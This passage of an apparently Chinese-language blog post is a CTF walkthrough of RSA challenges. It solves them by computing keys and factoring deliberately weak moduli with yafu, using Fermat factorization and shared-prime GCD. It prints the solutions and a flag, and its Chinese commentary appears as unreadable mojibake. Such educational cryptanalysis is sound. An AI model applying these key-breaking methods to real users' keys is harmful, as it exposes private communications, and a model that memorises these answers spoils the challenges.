class="hljs-keyword">Public</span> Modulus (n): <span class="hljs-number">93750367580497259754994151096824772408757991545943269927577541702139349923031</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Message <span class="hljs-keyword">to</span> encrypt (m): <span class="hljs-number">1234567890</span><br><br>What <span class="hljs-built_in">is</span> the ciphertext (c) <span class="hljs-keyword">for</span> the message (m) <span class="hljs-keyword">using</span> the <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>?<br><br># <span class="hljs-number">43342627728594194709171852585342053543398971218485131355267815503043000363802</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå«ä½ è®¡ç®—ä¸€ä¸‹å¯†æ–‡ã€‚å¾ˆç®€å•ã€‚</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs applescript">Challenge <span class="hljs-number">2</span>:<br><br>One <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> most intimidating things <span class="hljs-keyword">about</span> RSA when you <span class="hljs-keyword">first</span> <span class="hljs-built_in">read</span><br><span class="hljs-keyword">about</span> <span class="hljs-keyword">it</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> notion <span class="hljs-keyword">of</span> a <span class="hljs-string">&quot;modular inverse&quot;</span>. In our everyday lives<br>we&#x27;re pretty familiar <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> idea <span class="hljs-keyword">that</span> (<span class="hljs-number">1</span>/<span class="hljs-number">3</span>) * <span class="hljs-number">3</span> = <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">that</span> (<span class="hljs-number">5</span>/<span class="hljs-number">7</span>) *<br>(<span class="hljs-number">7</span>/<span class="hljs-number">5</span>) = <span class="hljs-number">1.</span>  That <span class="hljs-keyword">is</span>, <span class="hljs-number">1</span>/<span class="hljs-number">3</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> inverse <span class="hljs-keyword">of</span> <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-number">5</span>/<span class="hljs-number">7</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> inverse <span class="hljs-keyword">of</span><br><span class="hljs-number">7</span>/<span class="hljs-number">5.</span>  What happens though when <span class="hljs-keyword">the</span> numbers <span class="hljs-string">&quot;wrap around&quot;</span> because <span class="hljs-keyword">of</span> a<br>modulus? As one example, you can verify easily <span class="hljs-keyword">that</span> <span class="hljs-keyword">the</span> inverse <span class="hljs-keyword">of</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> <span class="hljs-keyword">is</span> <span class="hljs-number">3</span> <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> because <span class="hljs-number">2</span> * <span class="hljs-number">3</span> = <span class="hljs-number">6</span> <span class="hljs-keyword">and</span> <span class="hljs-number">6</span> <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> = <span class="hljs-number">1.</span> The idea <span class="hljs-keyword">that</span> <span class="hljs-number">2</span><br><span class="hljs-keyword">and</span> <span class="hljs-number">3</span> are inverses <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">at</span> all obvious. Or, even <span class="hljs-keyword">if</span> <span class="hljs-keyword">mod</span> <span class="hljs-number">5</span> <span class="hljs-keyword">is</span><br>obvious, <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> general case <span class="hljs-keyword">where</span> <span class="hljs-keyword">the</span> modulus <span class="hljs-keyword">is</span> large inverses are<br><span class="hljs-keyword">not</span> obvious.<br><br>In this challenge you are <span class="hljs-keyword">given</span> e <span class="hljs-keyword">and</span> n (<span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> factors <span class="hljs-keyword">of</span> n,<br>p <span class="hljs-keyword">and</span> q)<span class="hljs-keyword">and</span> you need <span class="hljs-keyword">to</span> find <span class="hljs-keyword">the</span> modular inverse <span class="hljs-keyword">of</span> e <span class="hljs-keyword">mod</span><br>phi(n). Recall <span class="hljs-keyword">that</span> when n has two factors phi(n) <span class="hljs-keyword">is</span> (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>).<br><br>== Generated Public Key ==<br>Public Modulus (n): <span class="hljs-number">98160686216077010306650598451384523493996357373041397278666044179163041918013</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br>== Secret Primes ==<br>Prime p: <span class="hljs-number">296478161395804220864289487232795949083</span><br>Prime q: <span class="hljs-number">331089095243782724782290601373623640711</span><br><br><br>What <span class="hljs-keyword">is</span> secret decrypting exponent (d) <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> couterpart <span class="hljs-keyword">of</span> e?<br><br><span class="hljs-comment"># 9919865492913591395104245136999247739392732302988070705640903774535857754853</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå«ä½ ç®—dï¼Œä¹Ÿå°±æ˜¯ç§é’¥ã€‚qï¼Œpéƒ½ç»™äº†ï¼Œç›´æ¥å¥—å…¬å¼å°±è¡Œã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Challenge <span class="hljs-number">3</span>:<br><br>RSA is <span class="hljs-keyword">an</span> <span class="hljs-string">&quot;asymmetric&quot;</span> encryption algorithm because <span class="hljs-keyword">the</span> key used <span class="hljs-built_in">to</span><br><span class="hljs-built_in">decrypt</span> (d) is <span class="hljs-keyword">not</span> <span class="hljs-keyword">the</span> same key that is used <span class="hljs-built_in">to</span> <span class="hljs-built_in">encrypt</span> (e). This<br>challenge will let you experience that <span class="hljs-keyword">first</span>-hand. You provide your<br>public key (n) <span class="hljs-keyword">and</span> (e) <span class="hljs-keyword">and</span> this challenge will <span class="hljs-built_in">encrypt</span> <span class="hljs-keyword">a</span> secret<br>message (m) <span class="hljs-keyword">and</span> provide you <span class="hljs-keyword">the</span> ciphertext (c). Then <span class="hljs-keyword">using</span> your<br>decrypting exponent (d) you can <span class="hljs-built_in">decrypt</span> <span class="hljs-keyword">the</span> ciphertext back <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span><br>secret message.<br><br>You are highly encouraged <span class="hljs-built_in">to</span> generate your own key here instead <span class="hljs-keyword">of</span><br>finding RSA <span class="hljs-built_in">keys</span> somewhere.<br><br>To pass this challenge <span class="hljs-keyword">the</span> n <span class="hljs-built_in">value</span> you provide must be <span class="hljs-keyword">at</span> least <span class="hljs-number">512</span><br>bits, <span class="hljs-keyword">not</span> be prime <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> e <span class="hljs-built_in">value</span> you choose must be <span class="hljs-keyword">at</span> least<br><span class="hljs-number">100.</span> <span class="hljs-number">65537</span> is <span class="hljs-keyword">a</span> good choice <span class="hljs-keyword">for</span> e.<br><br><br>What is n <span class="hljs-keyword">for</span> your public key?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå«æˆ‘ä»¬è‡ªå·±è¾“å…¥ä¸€ä¸ªnã€‚è¿™ä¸ªnå¿…é¡»æ˜¯512ä½ä»¥ä¸Šçš„ã€‚è€Œä¸”eè¦å¤§äº100ã€‚è¿™é‡Œæˆ‘ä»¬å°±ç”¨è‡ªå·±çš„ä»£ç ç”Ÿæˆå°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p = getPrime(<span class="hljs-number">512</span>)<br>    q = getPrime(<span class="hljs-number">512</span>)<br>    n = p*q<br>    <span class="hljs-keyword">if</span> n.bit_length() == <span class="hljs-number">1024</span>:<br>        <span class="hljs-built_in">print</span>(p)<br>        <span class="hljs-built_in">print</span>(q)<br>        <span class="hljs-built_in">print</span>(n)<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">10875694991805645215254668135517324330391142280861231776571929186459042877139016119856783459429519225579891325084663062250827914530190529161309788675368217</span><br><span class="hljs-string">9773480664355160440812724403080078613458928203389458915050187577280165834669443777233680522860771163143570050265715266656546946475962420080769836027441389</span><br><span class="hljs-string">106293394713836728584770048927645487102102551426684751134581194296372962576295840454537397021655815550308189352325607048529938553341796769007606529397626198231177636817810729599073564849299319322213650544188212299806442994412502877875106694978621139604395094335492409498378148226052685740633787250985960933413</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">What <span class="hljs-built_in">is</span> n <span class="hljs-keyword">for</span> your <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>? <span class="hljs-number">106293394713836728584770048927645487102102551426684751134581194296372962576295840454537397021655815550308189352325607048529938553341796769007606529397626198231177636817810729599073564849299319322213650544188212299806442994412502877875106694978621139604395094335492409498378148226052685740633787250985960933413</span><br><br>What <span class="hljs-built_in">is</span> e <span class="hljs-keyword">for</span> your <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>? <span class="hljs-number">65537</span><br>The ciphertext you must decrypt <span class="hljs-built_in">is</span> <span class="hljs-number">10747018944552439199720581255039720388084637469960708491916798595496468141161787523686458134928624981502687900182498988328445362551185644407711340320568644670092570168829217359152240930612218395791282480938275664550764054659163828364062000797849017204210153179497288454002327624996357110961011485773669626403</span><br><br>What was m (decrypt <span class="hljs-keyword">with</span> the d you<span class="hljs-comment">&#x27;ve made for your key!)?</span><br><br># <span class="hljs-number">193394912730819321447795805382820639777</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå°±å«æˆ‘ä»¬è§£å¯†äº†ï¼Œä¹Ÿæ˜¯ç›´æ¥ç”¨rsaçš„å…¬å¼å°±å¯ä»¥ã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># CTF&#123;right_so_awesome!&#125;</span><br></code></pre></td></tr></table></figure><h3 id="intermediate"><a class="markdownIt-Anchor" href="#intermediate"></a> Intermediate</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Challenge <span class="hljs-number">4</span>:<br><br>RSA <span class="hljs-built_in">is</span> only secure <span class="hljs-keyword">when</span> factoring n <span class="hljs-built_in">is</span> hard. <span class="hljs-keyword">If</span> you can factor n <span class="hljs-keyword">into</span><br>p <span class="hljs-built_in">and</span> q <span class="hljs-keyword">then</span> you can compute Euler<span class="hljs-comment">&#x27;s phi(n) (the totient function)</span><br>which, <span class="hljs-keyword">when</span> n only has two prime factors, <span class="hljs-built_in">is</span> just (p - <span class="hljs-number">1</span>) * (q -<br><span class="hljs-number">1</span>). <span class="hljs-keyword">With</span> phi(n) you can use e <span class="hljs-keyword">to</span> find d which gives you the <span class="hljs-keyword">private</span><br><span class="hljs-keyword">key</span>!<br><br><span class="hljs-keyword">In</span> this challenge, a secret message has been encrypted <span class="hljs-keyword">with</span> a very<br>weak RSA <span class="hljs-keyword">key</span>. The RSA <span class="hljs-keyword">key</span><span class="hljs-comment">&#x27;s n is approximately 128 bits meaning</span><br>(assuming they are the same size) p <span class="hljs-built_in">and</span> q are about <span class="hljs-number">64</span> bit <span class="hljs-keyword">each</span>. It<span class="hljs-comment">&#x27;s</span><br>your job <span class="hljs-keyword">to</span> decrypt the secret message <span class="hljs-keyword">by</span> breaking the RSA <span class="hljs-keyword">key</span> (factor<br>n!) <span class="hljs-built_in">and</span> <span class="hljs-keyword">then</span> determining d <span class="hljs-keyword">using</span> n<span class="hljs-comment">&#x27;s prime factors. 128-bit RSA keys</span><br>are just big enough you can<span class="hljs-comment">&#x27;t use trivial methods like trial division</span><br>but are easily small enough that almost anything more sophisticated<br>will factor them <span class="hljs-keyword">in</span> seconds.<br><br>== Generated <span class="hljs-keyword">Public</span> <span class="hljs-keyword">Key</span> ==<br><span class="hljs-keyword">Public</span> Modulus (n): <span class="hljs-number">232425609894096576101162633852002477913</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Message <span class="hljs-keyword">to</span> decrypt (c): <span class="hljs-number">191481802973151280528876229812887781569</span><br><br>What <span class="hljs-built_in">is</span> the plaintext (m) <span class="hljs-keyword">for</span> the encrypted message (c) <span class="hljs-keyword">for</span> the <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´çš„æ˜¯å¦‚æœèƒ½åˆ†è§£nçš„è¯å°±èƒ½å¾—åˆ°ç§é’¥å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†ã€‚ç»™å‡ºçš„nå¾ˆå°ï¼Œå¯ä»¥ç›´æ¥è¿›è¡Œåˆ†è§£çš„ã€‚ä½¿ç”¨yafuæ¥åˆ†è§£è¿™ä¸ªæ•°ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\yafu<span class="hljs-literal">-1</span>.<span class="hljs-number">34</span>&gt;yafu<span class="hljs-literal">-x64</span>.exe<br>factor(<span class="hljs-number">232425609894096576101162633852002477913</span>)<br><br><br>fac: factoring <span class="hljs-number">232425609894096576101162633852002477913</span><br>fac: <span class="hljs-keyword">using</span> pretesting plan: normal<br>fac: no tune info: <span class="hljs-keyword">using</span> qs/gnfs crossover of 95 digits<br>div: primes less than <span class="hljs-number">10000</span><br>fmt: <span class="hljs-number">1000000</span> iterations<br>rho: x^<span class="hljs-number">2</span> + <span class="hljs-number">3</span>, starting <span class="hljs-number">1000</span> iterations on C39<br>rho: x^<span class="hljs-number">2</span> + <span class="hljs-number">2</span>, starting <span class="hljs-number">1000</span> iterations on C39<br>rho: x^<span class="hljs-number">2</span> + <span class="hljs-number">1</span>, starting <span class="hljs-number">1000</span> iterations on C39<br>pm1: starting B1 = <span class="hljs-number">150</span>K, B2 = gmp<span class="hljs-literal">-ecm</span> default on C39<br>Total factoring time = <span class="hljs-number">0.0350</span> seconds<br><br><br>***factors found***<br><br>P20 = <span class="hljs-number">15829756971946610401</span><br>P20 = <span class="hljs-number">14682828694464462713</span><br><br>ans = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°äº†pï¼Œqå°±å¯ä»¥å¯¹å¯†æ–‡è¿›è¡Œè§£å¯†äº†ã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 8056816480286520941675656070</span><br></code></pre></td></tr></table></figure><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs vbnet">Challenge <span class="hljs-number">5</span>:<br><br>RSA<span class="hljs-comment">&#x27;s security relies on factorization being a hard</span><br>problem. Unfortunately there are many different factorization<br>algorithms that are quite fast <span class="hljs-keyword">in</span> certain special cases. This makes<br>generating secure RSA keys quite challenging because tons <span class="hljs-keyword">of</span> gotchas<br><span class="hljs-built_in">and</span> pitfalls must be avoided. One pitfall <span class="hljs-built_in">is</span> <span class="hljs-keyword">when</span> p <span class="hljs-built_in">and</span> q are too<br>close together because an algorithm known <span class="hljs-keyword">as</span> <span class="hljs-string">&quot;Fermat&#x27;s Factorization&quot;</span><br>can be used.<br><br><span class="hljs-keyword">In</span> this challenge, a <span class="hljs-number">2048</span> bit RSA <span class="hljs-keyword">key</span> has been generated <span class="hljs-keyword">using</span> two<br><span class="hljs-number">1024</span> bit primes, p <span class="hljs-built_in">and</span> q. The flaw <span class="hljs-built_in">is</span> that p <span class="hljs-built_in">and</span> q share approximately<br>their first <span class="hljs-number">500</span> bits. That may <span class="hljs-built_in">not</span> sound that bad since they still are<br>different <span class="hljs-keyword">in</span> their lower ~<span class="hljs-number">524</span> bits but you<span class="hljs-comment">&#x27;ll see that isn&#x27;t nearly</span><br>enough.<br><br>== Generated <span class="hljs-keyword">Public</span> <span class="hljs-keyword">Key</span> ==<br><span class="hljs-keyword">Public</span> Modulus (n): <span class="hljs-number">25240054906527308715123083513191206839625173490523222251828485342363714336785380565865997526799064756242760495920245470292094107572885037758544627319924131106469206061990262762473830559723089863710658174860933300953411483624472662692904888669381554917178242116550796585404855973132973772929016519378021061815488878618803864877487986518434955737510882129986289035083960210216734245350444938463326983372446311710518586992606167860499851814468283028623132695394370326534082149664539102785030529344576581865843167524739917242789374803048921371234481347145388496209423571350226798734660569948183356006127158058090767513593</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><br>Message <span class="hljs-keyword">to</span> decrypt (c): <span class="hljs-number">10426074392847872381473627569957969180320053109752606227916079994083532053799703036065905282122615431437721866313171294013350515428252537309345482269880415619442294601156752585446010009194624361395148280761278099888525138605830066285813688990522801677857932428538220521983981413448850469004996008927906933730792935466887940039979883069300623808947669972015213977651647997784626563669640738954071792582917241174307901215091315797664765124678924852716239603589657100939596203624339673928916386333510127266261894581633834712017193560070996878504040955960547901590264230976711955989542053963668368387177301946035693856117</span><br><br>What <span class="hljs-built_in">is</span> the plaintext (m) <span class="hljs-keyword">for</span> the encrypted message (c) <span class="hljs-keyword">for</span> the <span class="hljs-keyword">public</span> <span class="hljs-keyword">key</span>?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´çš„æ˜¯å¦‚æœç”Ÿæˆnçš„ä¸¤ä¸ªç´ æ•°ç›¸è·å¾ˆè¿‘çš„è¯ï¼Œå¾ˆå®¹æ˜“è¢«åˆ†è§£å‡ºæ¥ã€‚på’Œqçš„é«˜ä½å¤§éƒ¨åˆ†ç›¸åŒï¼Œä½†æ˜¯è¿™ä¸å®‰å…¨ã€‚è¿™å¯ä»¥ä½¿ç”¨è´¹é©¬åˆ†è§£æ³•æ¥å¯¹nè¿›è¡Œåˆ†è§£ã€‚ä¹Ÿå°±æ˜¯ä»–è¯´çš„ â€œFermatâ€™s Factorizationâ€ã€‚yafué‡Œé¢é›†æˆäº†å¾ˆå¤šnçš„åˆ†è§£æ–¹æ³•æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨yafuè¿›è¡Œåˆ†è§£ã€‚</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\yafu<span class="hljs-literal">-1</span>.<span class="hljs-number">34</span>&gt;yafu<span class="hljs-literal">-x64</span>.exe<br>factor(<span class="hljs-number">25240054906527308715123083513191206839625173490523222251828485342363714336785380565865997526799064756242760495920245470292094107572885037758544627319924131106469206061990262762473830559723089863710658174860933300953411483624472662692904888669381554917178242116550796585404855973132973772929016519378021061815488878618803864877487986518434955737510882129986289035083960210216734245350444938463326983372446311710518586992606167860499851814468283028623132695394370326534082149664539102785030529344576581865843167524739917242789374803048921371234481347145388496209423571350226798734660569948183356006127158058090767513593</span>)<br><br><br>fac: factoring <span class="hljs-number">25240054906527308715123083513191206839625173490523222251828485342363714336785380565865997526799064756242760495920245470292094107572885037758544627319924131106469206061990262762473830559723089863710658174860933300953411483624472662692904888669381554917178242116550796585404855973132973772929016519378021061815488878618803864877487986518434955737510882129986289035083960210216734245350444938463326983372446311710518586992606167860499851814468283028623132695394370326534082149664539102785030529344576581865843167524739917242789374803048921371234481347145388496209423571350226798734660569948183356006127158058090767513593</span><br>fac: <span class="hljs-keyword">using</span> pretesting plan: normal<br>fac: no tune info: <span class="hljs-keyword">using</span> qs/gnfs crossover of 95 digits<br>div: primes less than <span class="hljs-number">10000</span><br>fmt: <span class="hljs-number">1000000</span> iterations<br>Total factoring time = <span class="hljs-number">7.6796</span> seconds<br><br><br>***factors found***<br><br>P309 = <span class="hljs-number">158871189668005283415144657986551193302869428022001726220647816798498163786655160734083642077926887626968994149548144770437583756497334125901064680461238653949200872152467592040526765560776849130898789230056872627669722209677289335370789152455332871728170193718878900033253778086216110326217359038965751457767</span><br>P309 = <span class="hljs-number">158871189668005283415144657986551193302869428022001726220647816798498163786655160734083642077926887626968994149548144770437583756497334125901064680461234832110504013303470429626460988959707000583806418183588832922742389554954078372113253029216897932455245679734943989771289650860903610854223547207721942050079</span><br><br>ans = <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬å°±å¾—åˆ°äº†pä¸qã€‚è¿›è¡Œè§£å¯†å³å¯ã€‚</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 85264668993792422195045856889255535675920204275110143264715798301682527037703</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Challenge <span class="hljs-number">6</span>:<br><br>It <span class="hljs-keyword">is</span> critically important that the primes used <span class="hljs-keyword">in</span> an RSA key have<br>never been used <span class="hljs-keyword">in</span> <span class="hljs-keyword">any</span> other RSA key. <span class="hljs-keyword">If</span> two keys happen <span class="hljs-keyword">to</span> <span class="hljs-keyword">share</span> a<br>prime <span class="hljs-keyword">then</span> a quick comparison <span class="hljs-keyword">using</span> the GCD algorithm <span class="hljs-keyword">between</span> the two<br>n <span class="hljs-keyword">values</span> will find a common prime. This <span class="hljs-keyword">is</span> a common flaw <span class="hljs-keyword">for</span> keys<br><span class="hljs-keyword">generated</span> <span class="hljs-keyword">on</span> devices <span class="hljs-keyword">with</span> poor (<span class="hljs-keyword">or</span> <span class="hljs-keyword">no</span>) entropy <span class="hljs-keyword">on</span> first boot.<br><br>This challenge generates two keys that <span class="hljs-keyword">share</span> a prime. Use the GCD<br><span class="hljs-keyword">between</span> the two n <span class="hljs-keyword">to</span> find the common prime.<br><br>== <span class="hljs-keyword">Generated</span> <span class="hljs-built_in">Public</span> Key <span class="hljs-number">1</span> ==<br><span class="hljs-built_in">Public</span> Modulus (n): <span class="hljs-number">25766855849012170602215974276512994665527760103232878510877708579134451117925205685988667478305686774909581308048305405982227012155215071376134036940929029662904505877622287438422321334710416342122246755031087867738529234615302073381335900455830870395122148361228482894414857023560773160530764583158671668598804795236806439696444767416669004606904236852625407455032822014231606087073213831281114887244532839729675040811323228917519504038450191315875150823702300759184612618800826323992940766242448628052050372979262990010935907002585341542207395142877707331416760094045455941053408610742527475497038936581984374880709</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><span class="hljs-keyword">Encrypted</span> message (c): <span class="hljs-number">10525814866510137434899274998082698726988868256233514176953502719354264032410185277614127761527071749571758119230375451756494965691920242823875047761236402904697195895757175042349370909038642191817523007191322103279536254571467901947532676209111044078805574511874421763608159336854724603736343437950821917939678565773065914042640814861551433414991462029439854218529934675178281414333981877196921950767775395220428028907601554437040987071711361174143526222051997404012801968532202680596542050070864790765315160191871148699455255350919126797448710611287281082665133892808503848186989158095870812598832558333246789042676</span><br><br>== <span class="hljs-keyword">Generated</span> <span class="hljs-built_in">Public</span> Key <span class="hljs-number">2</span> ==<br><span class="hljs-built_in">Public</span> Modulus (n): <span class="hljs-number">23029445296375982244621042067356938067600932656366159682913502418113458794974570308801738092925111529731228548404356478117663790755942048917363075846055763270676348368932404632553120873938932115409549042302048379540139242329521312179497517707113409555264863436910061516286482903931874204248958042186907817570230042112727883343124487662643844328226394430868012939455393801202299874213974171731230732650780391625138430545738601970201658394385606885566557862983885797334286100689371547075235155161498539779469617285566915877747705913072389949483202393235902365901491091866493162015415874138858126412365811099585224212299</span><br>Encrypting Exponent (e): <span class="hljs-number">65537</span><br><span class="hljs-keyword">Encrypted</span> message (c): <span class="hljs-number">15825489607550127439145806852385542839567883239057363905562871179426946402042942076016730509123999510531814642125437244542503343524213169970527943119058139473890975392849048101137592242977766658809403638381196910489834667796018783886181113320540459578692631939111357899549377553003879410941929489345106395564870136122987632435751994319822778186510306221275589605892748144352896531387710390605511956945032387237242470561632107510753242284083264220415607441731463294577007558615036100651711547573054889611720078234249393852435728233068931521415540782361953536967033384859985153392456809560643291691859128343066976633307</span><br><br>The same message (m) was <span class="hljs-keyword">encrypted</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">both</span> keys, what was the message?<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¯´çš„æ˜¯ä¸€ä¸ªç´ æ•°å‚ä¸äº†ä¸¤ä¸ªnçš„ç”Ÿæˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨GCDæ¥è®¡ç®—è¿™ä¸ªç´ æ•°ï¼Œä»è€Œç ´è§£ä¸¤ä¸ªNçš„åˆ†è§£ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> sympy<br><br>n1 = <span 